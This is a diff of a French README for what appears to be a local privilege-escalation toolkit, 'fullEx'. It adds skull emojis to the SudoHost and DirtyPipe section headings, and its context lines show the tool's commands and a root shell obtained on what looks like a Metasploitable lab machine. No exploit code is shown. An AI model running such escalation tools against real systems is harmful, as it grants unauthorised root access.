@@ -45,7 +45,7 @@ Commands:
    -perm          Applique les droit d'execution '/fullEx'
    -help          Affiche les commandes
  ```
-# SudoHost
+# 💀 SudoHost
 
 ```
 vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
@@ -62,7 +62,7 @@ root@dev# bash -i
 root@metasploitable3-ub1404:~/fullEx# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-# DirtyPipe
+# 💀 DirtyPipe
 
 ```
 www-data@university:/tmp/fullEx$ ./fullEx.sh -DirtyPipe
